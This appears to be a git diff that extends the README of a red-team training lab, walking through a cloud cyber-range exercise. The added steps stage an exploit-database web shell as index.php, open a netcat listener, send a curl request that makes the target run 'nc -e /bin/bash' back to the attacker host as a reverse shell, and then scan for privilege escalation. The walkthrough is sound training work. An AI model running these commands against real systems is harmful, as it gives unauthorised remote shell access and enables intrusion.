@@ -38,8 +38,64 @@ git clone https://github.com/redteam-project/cyber-range-target
 git clone https://github.com/redteam-project/exploit-curation
 ```
 
-8. Make this instance vulnerable to Shellshock and xxx
+8. Make this instance vulnerable to Shellshock and libfutex
 
 ```
-ansible-playbook meetup/20180321/blue.yml
+ansible-playbook meetup/20190321/blue.yml
 ```
+
+9. Wait for the instance to reboot, then re-log in
+
+```
+gcloud compute ssh blue-1 --zone us-east4-a
+```
+
+10. Now scan for exploitable vulnerabilities with `lem`
+
+```
+sudo su -
+virtualenv venv
+source venv/bin/activate
+pip install lem
+lem host assess --curation exploit-curation --kind stride --score 090000
+lem exploit copy --id 35146 --source exploit-database --destination /var/www/html --curation exploit-curation
+mv /var/www/html/exploit-database-35146.txt /var/www/html/index.php
+```
+
+11. Our remote code execution vulnerability is now ready to exploit. Now start two new Cloud Shell instances and ssh to red-1 from both.
+
+```
+gcloud compute ssh red-1 --zone us-east4-a
+```
+
+12. In the first `red-1` shell, install Netcat and start a listener on port 4444.
+
+```
+yum install -y nmap-ncat
+nc -nlv 4444
+```
+
+13. In the second `red-1` shell, exploit the Shellshock vulnerability we staged in step 10. Replace the IP addresses with your blue-1 and red-1 IPs, respectively.
+
+```
+curl -X GET 'http://10.150.0.6/index.php?cmd=nc%20-nv%2010.150.0.7%204444%20-e%20/bin/bash'
+```
+
+14. Now in the first `red-1` shell, you should have a reverse shell to `blue-1`. Use this Python trick to get a tty and invoke bash.
+
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+15. Create a virtualenv, install lem, and look for a privilege escalation vulnerability.
+
+```
+cd /tmp
+virtualenv venv
+source venv/bin/activate
+pip install lem
+git clone https://github.com/redteam-project/exploit-curation
+lem host assess --curation exploit-curation --kind stride --score 000009
+```
+
+16. Stage the exploit and pop root.
